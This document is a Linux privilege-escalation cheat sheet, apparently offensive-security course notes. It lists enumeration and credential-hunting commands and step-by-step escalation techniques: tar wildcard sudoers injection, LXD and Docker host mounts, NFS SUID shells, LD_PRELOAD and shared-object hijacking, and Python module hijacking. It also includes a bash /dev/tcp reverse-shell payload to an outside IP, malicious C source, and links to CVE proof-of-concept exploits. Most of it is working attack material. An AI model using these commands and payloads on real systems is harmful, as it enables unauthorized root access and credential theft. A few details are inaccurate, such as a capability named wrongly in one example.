# Information Gathering

## -Environment Enumeration-

**Helper Scripts**

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | [LinEnum](https://github.com/rebootuser/LinEnum) | [Lynis](https://github.com/CISOfy/lynis)

| **Command**                                                              | **Description**                                                 |
| ------------------------------------------------------------------------ | --------------------------------------------------------------- |
| `whoami`                                                                 | Describes current user                                          |
| `id`                                                                     | Describes the groups that the current user belongs to           |
| `hostname`                                                               | What the is server named                                        |
| `ifconfig or ip -a`                                                      | What subnet the server is in                                    |
| `systemctl --type=service --state=active`                                | What services are in a running state on machine                 |
| `sudo -l`                                                                | can the user run anything with sudo                             |
| `cat /etc/os-release`                                                    | Check OS and version                                            |
| `echo $PATH`                                                             | Check the current users path                                    |
| `env`                                                                    | Check all environment variables for user                        |
| `uname -a`                                                               | Check the Kernel version                                        |
| `lscpu`                                                                  | Information about the host itself such as the CPU type/version  |
| `cat /etc/shells`                                                        | What login shells exist on the server                           |
| `lsblk`                                                                  | Look at the drives and any shares on the system                 |
| `lpstat`                                                                 | Find information about any printers attached to the system      |
| `cat /etc/fstab`                                                         | Check for mounted drive creds by grepping for username/password |
| `route or netstat -rn`                                                   | Check routing table                                             |
| `/etc/resolv.conf`                                                       | Useful for domain joined servers                                |
| `arp -a`                                                                 | Check the ARP table for other hosts                             |
| `cat /etc/passwd`                                                        | Find info about users on the system                             |
| `cat /etc/shadow`                                                        | Login info for users (unlikely to be readable without root)     |
| `cat /etc/group`                                                         | Find information about the system groups (and users)            |
| `getent group sudo`                                                      | Query group file for interesting groups/users                   |
| `ls -lisa /home`                                                         | ALWAYS check the home directory for current user and others     |
| `df -h`                                                                  | General information about the linux distro                      |
| `cat /etc/fstab \| grep -v "#" \| column -t`                             | Find unmounted file systems                                     |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep <USER>` | Find all hidden user files                                      |
| `find / -type d -name ".*" -ls 2>/dev/null`                              | Find all hidden directories                                     |
| `ls -lisa /tmp /var/tmp /dev/shm`                                        | Check tmp folders for scripts or other loot                     |

## -Linux Services & Internals Enumeration-

| **Command**                                                                                                                                                                              | **Description**                                                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `cat /etc/hosts`                                                                                                                                                                         | Describes current users hosts file                                                   |
| `lastlog`                                                                                                                                                                                | Find the last login time for user                                                    |
| `who or finger`                                                                                                                                                                          | Check if anyone is on the system at the same time                                    |
| `history`                                                                                                                                                                                | Check the users command history                                                      |
| `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                                                                                                     | Find any special history files created by scripts/programs                           |
| `ls -la /etc/cron.daily/`                                                                                                                                                                | Show all daily cron jobs on the system                                               |
| `find /proc -name cmdline -exec cat {} \; 2>/dev/null\| tr " " "\n"`                                                                                                                     | Find information from proc/procfs file system on processes, hardware, etc            |
| `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list`                                                                               | List of installed packages                                                           |
| `for i in $(curl -s https://gtfobins.github.io/ \| html2text \| cut -d" " -f1 \| sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done` | Bash one-liner that will compare installed binaries to GTFObins to investigate later |
| `sudo -V`                                                                                                                                                                                | Check the sudo version for known exploits                                            |
| `ls -l /bin /usr/bin/ /usr/sbin/`                                                                                                                                                        | Look for compiled binaries installed on system                                       |
| `ps aux \| grep root`                                                                                                                                                                    | Find services running as root user                                                   |
| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\\\|snap\\\|share"`                                                                                                              | Find all scripts on system                                                           |
| `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                                                                                                      | Find all configuration files                                                         |
| `strace ping -c1 <IP ADDR>`                                                                                                                                                              | Linix diagnostic tool to track and analyze system calls and signal processing        |

## -Credentials Hunting-

| **Command**                                                       | **Description**                                                      |
| ----------------------------------------------------------------- | -------------------------------------------------------------------- |
| `cat wp-config.php \| grep 'DB_USER\|DB_PASSWORD'`                | ALWAYS check web root for creds (example WP site MySQL SB)           |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Find spool or mail directories to check for creds                    |
| `ls ~/.ssh`                                                       | Check current user for SSH keys and known_hosts file to find targets |

# Environment-based Privilege Escalation

## -Path Abuse-

| **Command**                                          | **Description**                                                         |
| ---------------------------------------------------- | ----------------------------------------------------------------------- |
| `echo $PATH or env \| grep PATH`                     | Check the contents of the PATH variable                                 |
| `PATH=.:${PATH} && export PATH && echo $PATH`        | Add the '.' current dir to user's PATH to abuse PATH                    |
| `touch ls && echo 'echo "TEST"' > ls && chmod +x ls` | _Example of how path abuse can be used if current dir is added to PATH_ |

## -Wildcard Abuse-

This attack is based on the environment available. An example of this type of attack follows:

Take the following vulnerable cron job on the victim's system:

```
#
#
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

The wildcard in the cronjob can be abused when the attacker commands are written as file names. This causes the cronjob to run the attacker commands:

```
user@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
user@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
user@NIX02:~$ echo "" > --checkpoint=1
```

## -Escaping Restricted Shells-

**Types of restricted shells:**

[Restricted Bourne shell (rbash)](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) | [Restricted Korn shell (rksh)](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) | [Restricted Z shell (rzsh)](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)

When in a restricted shell there will be a pre-defined set of actions that are allowed. The first step in escaping is determining the capabilities of the shell.

Take the example scenario where the restricted shell only allows `ls -l` or `ls -a` to be run. In this case command injection may be possible to escape the shell by injecting additional commands into the args of the ls command.

```
Anon4Now@NIX[/home]$ ls -l `pwd`
```

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow for the execution of the pwd command and seeing the current working directory, even though the shell does not allow us to execute the pwd command directly.

Other possible techniques:

- Command Substitution: This involves using the shell's command substitution syntax to execute a command.
- Command Chaining: Use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.
- Environment Variables: Modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: Define and call shell functions that execute commands not restricted by the shell.

# Permissions-based Privilege Escalation

## -Special Permissions-

| **Command**                                                     | **Description**                 |
| --------------------------------------------------------------- | ------------------------------- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SGID bit set |

## -Sudo Rights Abuse-

| **Command** | **Description**                           |
| ----------- | ----------------------------------------- |
| `sudo -l`   | Check if current user has sudo privileges |

## -Privileged Groups-

**LXC/LXD**

LXD is similar to Docker and is Ubuntu's container manager. If the user is part of the 'lxd' group, this may be an opportunity for privilege escalation.

Reference the below section Containers on how to potentially exploit this group.

```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

**Docker**

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers.

Reference the below section Containers on how to potentially exploit this group.

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

**Disk**

Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges.

```
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(disk)
```

**ADM**

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

## -Capabilities-

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This technique can be used to escape containers, to learn more click [HERE](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities).

| **Capability**       | **Description**                                                                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cap_sys_admin        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| cap_sys_chroot`      | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
|                      |
| cap_sys_ptrace       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| cap_sys_nice         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| cap_sys_time         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| cap_sys_resource     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
|                      |
| cap_sys_module       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| cap_net_bind_service | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

| **Command**                                                                         | **Description**                                                          |
| ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` | Find binaries on the system and show the capabilities that have been set |

_Example below of how capabilities could be used to escalate privileges:_

Check the capabilities of the binary.

```
Anon4Now@NIX[/home]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Read the first entry in passwd file.

```
Anon4Now@NIX[/home]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Use the cap_sys_admin capability of the /usr/bin/vim binary to modify a system file:

```
Anon4Now@NIX[/home]$ /usr/bin/vim.basic /etc/passwd
```

Modify the first entry in the passwd file to remove the 'x' in the line (allows for login without pass).

```
Anon4Now@NIX[/home]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
Anon4Now@NIX[/home]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Switch user to root.

```
Anon4Now@NIX[/home]$ su -
```

# Service-based Privilege Escalation

## -Vulnerable Services-

Always check the versions of the services that are running, to determine whether a known exploit exists.

| **Command**                                | **Description**                            |
| ------------------------------------------ | ------------------------------------------ |
| `systemctl --type=service --state=running` | Find running services to check versions on |

## -Cron Job Abuse-

| **Command**                                                   | **Description**                                                                                                         |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Look for writeable files or directories, specifically scripts                                                           |
| `./pspy64 -pf -i 1000`                                        | Run [pspy](https://github.com/DominicBreuker/pspy) to view running processes, commands by other users, cronjobs, etc... |

## -Containers-

**LXC/LXD**

To exploit either lxc or lxd, the attacker needs to be able to run a container on the target machine. This can be accomplished by either transferring a container image to the target, or finding an image leftover from the sysadmin. From there the following commands (or similar) can be run to escalate privileges.

Requires group privileges to run:

```
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

| **Command**                                                                                    | **Description**                                                     |
| ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `lxc image import <IMAGE_NAME> --alias <ALIAS_NAME>`                                           | Import an image file into LXC (e.g., ubuntu-template.tar.xz)        |
| `lxc image list`                                                                               | List the container images on the server                             |
| `lxc init <ALIAS_NAME> <CONTAINER_NAME> -c security.privileged=true`                           | Initiate the image with the 'security.privileged=true' flag         |
| `lxc config device add <CONTAINER_NAME> host-root disk source=/ path=/mnt/root recursive=true` | Update the image config for mounting the container on the root path |
| `lxc start <CONTAINER_NAME>`                                                                   | Start the container                                                 |
| `lxc exec <CONTAINER_NAME> /bin/bash`                                                          | Log into running container with bash                                |
| `ls -l /mnt/root`                                                                              | Check the mounted host machine file directory                       |

**Linux Docker**

To escalate privileges the attacker needs to be in the docker group (shown below), in the sudoers file, or docker needs to have the SUID bit set. If any of these scenarios are present, the attacker can control the docker daemon and access the root file system. A docker image must either be present on the machine or one must be transferred.

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

| **Command**                                                   | **Description**                                                                           |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| `docker image ls`                                             | List the docker images on the host                                                        |
| `docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash` | Run a container from the image, mount to the host directory, and shell into the container |
| `ls -l /mnt`                                                  | Check the mounted host machine file directory                                             |

**Docker Socket**

A case that can also occur is when the Docker socket is writable. Usually this socket is located in /var/run/docker.sock, however the location can differ. This location can only be written by root or docker group, which if the attacker acts as a user not in one of these two groups and the Docker socket still has the privileges to be writable, then it should provide an opportunity to escalate privileges.

| **Command**                                                                                  | **Description**                                                    |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash` | Run as a user not in root or docker group, mount to host, and bash |
| `ls -l /mnt`                                                                                 | Check the mounted host machine file directory                      |

## -Logrotate-

Logrotate is the Linux program tasked with managing the accumulation of log files on the machine to prevent the hard disk from overflowing. It accomplishes this by either renaming the file '.old' or emptying the file contents.

To exploit logrotate, there are some pre-requisites the must be met:

- The attacker needs write permissions on the log files
- Logrotate must run as a privileged user or root
- Logrotate has to be a vulnerable version:
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

If the above requirements are met, the pre-fabricated exploit [logrotten](https://github.com/whotwagner/logrotten) can be used on the target machine.

| **Command**                                                             | **Description**                                                                    |
| ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `git clone https://github.com/whotwagner/logrotten.git && cd logrotten` | Download the exploit repo and cd into it                                           |
| `gcc logrotten.c -o logrotten`                                          | Compile the source code                                                            |
| `echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload`             | Generate payload (IT DOES NOT NEED TO BE THE EXAMPLE ONE)                          |
| `grep "create\|compress" /etc/logrotate.conf \| grep -v "#"`            | Determine the function used by logrotate (necessary to select the correct exploit) |
| `nc -nlvp <PORT>`                                                       | Start netcat on attacker machine to catch reverse shell                            |
| `./logrotten -p ./payload /tmp/tmp.log`                                 | Run exploit on target machine and wait for shell                                   |

## -Misc Techniques-

These techniques are entirely dependent on some services/tools being available on the target machine. This section will have new additions to it if the technique does not easily fit into another category.

</br>

**Passive Network Traffic Capture**

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

</br>

**Weak NFS Privileges**

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049.

_--Show accessible mounts--_

```
Anon4Now@attacker[/home]$ showmount -e <TARGET_IP>

Export list for <TARGET_IP>:
/tmp             *
/var/nfs/general *
```

_--Check mount permissions--_

```
target@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

| **Option**     | **Description**                                                                                                                                                                                                                                                                           |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| root_squash    | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
|                |
| no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                       |
|                |

_--Create simple binary starts a bash shell target host--_

```
target@NIX02:~$ cat shell.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

target@NIX02:/tmp$ gcc shell.c -o shell
```

_--Mount the directory locally, copy it, and set the necessary permissions--_

```
root@Pwnbox:~$ sudo mount -t nfs <TARGET_IP>:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

_--Switch back to low-privileged user and execute binary to gain elevated privileges--_

```
target@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

</br>

**Hijacking Tmux Sessions**

Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. A user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked.

_--Check for any running tmux processes--_

```
target@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

_--Confirm permissions--_

```
target@NIX02:~$ ls -la /shareds

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

_--Review compromised user group membership--_

```
target@NIX02:~$ id

uid=1000(target) gid=1000(target) groups=1000(target),1011(devs)
```

_--Attach to the tmux session and confirm root privileges--_

```
target@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

# Linux Internals-based Privilege Escalation

## -Shared Libraries-

It is common for Linux programs to use dynamically linked shared object libraries. Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension).

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.

Additionally, the LD_PRELOAD environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.

</br>

**LD_PRELOAD Privilege Escalation**

To use LD_PRELOAD to escalate privileges, the compromised user must have sudo privileges.

_--Check user privileges--_

```
target@NIX02:~$ sudo -l

Matching Defaults entries for target on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User target may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

_--Create malicious C code--_

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

_--Compile the code with the following flags--_

```
target@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

_--Escalate privileges using the below command (Make sure to specify the full path to the malicious library file)--_

```
target@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

## -Shared Object Hijacking-

Programs and binaries under development usually have custom libraries associated with them. If a custom program or binary is ID'd on the target machine, use the [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) command to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

_--Run ldd on custom binary--_

```
target@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

A non-standard library named libshared.so was listed as a dependency for the binary. It is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

_--Run readelf on custom binary--_

```
target@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

_--Check folder permissions--_

```
target@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. The attacker can now compile a shared object which includes this function.

_--Copy one of the library dependencies to the exploitable folder--_

```
target@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

_--Confirm that the custom binary is looking for dependencies in the exploitable folder--_

```
target@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

_--Attempt to run the binary to find which function is being called in the shared library--_

```
target@NIX02:~$ ./payroll

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

_--Create malicious C code that will create a bash shell using the name of the function being called from shared library--_

```
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

_--Compile the C code with the following flags--_

```
target@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so

```

_--Execute binary and check for root shell--_

```
target@NIX02:~$ ./payroll

***************Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(target) groups=1000(target)
```

## -Python Library Hijacking-

There are many ways in which an attacker can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

- Wrong write permissions
- Library Path
- PYTHONPATH environment variable

</br>

**Wrong Write Permissions**

One or another python module may have write permissions set for all users set by mistake on a compromised host. This allows the python module to be edited and manipulated so that malicious commands or functions can be inserted that will produce the escalation. If SUID/SGID permissions have been assigned to the Python script that imports this module, the malicious code will automatically be included when the calling script is run.

_--Example py script--_

```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

```
target@lpenix:~$ ls -l mem_stats.py

-rwsrwxr-x 1 root target 188 Dec 13 20:13 mem_stats.py
```

_--Look for module permissions & contents--_

```
target@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


target@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```
...SNIP...

def virtual_memory():

	...SNIP...

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

_--Hijack the module contents--_

Modify the module code and run the main script with sudo and check if the desired result occurs.

```
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')


    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

```
target@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

</br>

**Library Path**

The escalation techniques takes advantage of the order of precendence in which Python modules are searched for and imported.

To be able to use this variant, two prerequisites are necessary.

The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable output.
The attacker must have write permissions to one of the paths having a higher priority on the list.
Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by the compromised user, the attacker can create a module with the same name and include the desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

_--List the PYTHONPATH--_

```
target@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

_--Identify import statements for Python script that compromised user can run--_

In this example script, the Library 'psutil' is imported into the script.

```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

_--Find paths for the imported library--_

```
target@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

Because the path for the imported 'psutil' module is **BELOW** the other imported paths, this provides an opportunity to check those other paths for writable directories.

_--Find writable PYTHONPATH directories--_

```
target@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

The above directory allows for the compromised user to write to it. To abuse this for escalation, the next steps are to create an identically name module as 'psutil' that contains the exact same functions and number of arguments as the authentic module **WITHIN** the writable directory /usr/lib/python3.8.

_--Create malicious python file--_

```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

_--Run the main script as Sudo and check for escalation--_

```
target@lpenix:~$ sudo /usr/bin/python3 mem_stats.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_stats.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```

</br>

**PYTHONPATH Variable Manipulation**

PYTHONPATH is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a user-defined location when it comes time to import modules.

To abuse this as an attacker, the pre-requisite must be met that the compromised user must be able to run python with sudo.

_--Check compromised user sudo permissions--_

```
target@lpenix:~$ sudo -l

Matching Defaults entries for target on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User target may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

The compromised user is allowed to run /usr/bin/python3 under the trusted permissions of sudo and is therefore allowed to set environment variables for use with this binary by the SETENV: flag being set.

_--Check a script that the compromised user can run for imported libraries--_

```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

This script imports the 'psutils' library, which can now be potentially abused for escalation by creating a identically named module.

_--Build malicious duplicate module--_

```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Move this malicious module to anywhere the compromised user can write files (e.g., /tmp), and execute the main script with the additional args.

_--Run the main script and check for escalation--_

```
target@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

# Recent 0-Days (as of 6-16-23)

This is not a comprehensive list by any means of known 0-Days, but these are some of the best documented with a lot of working POC's.

**SUDO**

- CVE-2021-3156
  - Heap based buffer overflow
  - Affects multiple SUDO version(s):
    - 1.8.31 - Ubuntu 20.04
    - 1.8.27 - Debian 10
    - 1.9.2 - Fedora 33
    - etc...
  - Working [POC](https://github.com/blasty/CVE-2021-3156)
- CVE-2019-14287
  - Signed integer issue
  - Affected SUDO version(s):
    - all versions below 1.8.28

</br>

**Polkit**

- CVE-2021-4034
  - Memory corruption vulnerability
  - Affects polkit version(s):
    - Test with [POC](https://github.com/berdav/CVE-2021-4034)
  - Working [POC](https://github.com/arthepsy/CVE-2021-4034)

</br>

**Dirty-pipe**

- CVE-2022-0847
  - Kernel vulnerability
  - Affected version(s):
    - All kernels from version 5.8 to 5.17
  - Working [POC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

</br>

**Netfilter**

- CVE-2021-22555
  - Kernel vulnerability
  - Affected version(s):
    - 5.10.5-051005-generic
  - Working [POC](https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c)
- CVE-2022-25636
  - Kernel Vulnerability
  - Affected version(s):
    - 5.13.0-051300-generic
